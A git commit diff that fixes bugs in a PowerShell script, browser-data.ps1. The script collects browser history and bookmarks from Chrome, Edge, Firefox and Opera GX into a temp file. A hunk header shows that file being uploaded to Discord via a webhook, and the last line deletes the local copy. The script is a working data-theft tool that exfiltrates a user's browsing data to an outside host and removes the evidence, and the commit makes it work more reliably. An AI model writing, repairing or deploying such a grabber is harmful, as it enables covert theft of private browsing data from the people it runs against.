416fbfb14b2f86c67ccf9f9e6f45dbf81c870779
dldygnl <53053198+dldygnl@users.noreply.github.com>
2025-09-02 18:52:31 +0800

    Update browser-data.ps1

--- browser/browser-data.ps1
+++ browser/browser-data.ps1
@@ -16,7 +16,7 @@ function Get-BrowserData {
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
     elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
     $Value | ForEach-Object {
@@ -38,7 +38,7 @@ Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.
 
 Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
 
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
 
@@ -74,4 +74,4 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--Browser
 
 
 ############################################################################################################################################################
-RI $env:TEMP/--BrowserData.txt
+RI $env:TEMP\--BrowserData.txt
